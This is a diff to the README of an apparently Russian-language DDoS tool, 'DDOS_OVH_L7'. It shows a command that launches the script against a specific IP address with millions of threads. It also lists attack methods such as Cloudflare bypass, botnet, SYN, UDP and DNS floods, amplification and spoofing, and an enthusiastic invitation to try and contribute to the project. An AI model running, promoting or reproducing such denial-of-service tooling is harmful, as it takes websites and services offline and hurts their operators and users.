@@ -27,7 +27,10 @@ cd DDOS_OVH_L7
 Run Python Script: python DDOS_OVH.py --url http://37.187.56.77 --method OVH GET --threads 9999999
 ```
 
+```
 Доступные методы 'GET', 'POST', 'HEAD', 'HTTP-SYN', 'HTTP-SYN-TPC', 'OVH', 'OVH BOT', 'DGB', 'AVB', 'CFBUAM', 'BYPASS', 'CFB', 'GSB', 'uambypass', 'BOTNET_V1','BOTNET_V2', 'SYN', 'AMP', 'socks_cflow', 'TCP_ATTACK', 'CFSOC', 'BOMB', 'ovh2', 'STRESS', 'Connection', 'TLSv2', 'cc', 'ntp_mem','ICMPFlood','UDPFlood','udp_flood','attackSKY','RHEX','NULL','COOKIES','Launchspoof','attackbypass','LaunchCFPRO','dgb_solver','http_flood','PPS','dns_flood','BOT_V1','https_spoof','KILLER'
+```
+
 Я уже не могу дождаться, когда вы попробуете эту программу и поделитесь своими впечатлениями. Приглашаю вас внести свой вклад и присоединиться к этому захватывающему проекту! 💪
 
 🚀 Hello, GitHub community! 🚀
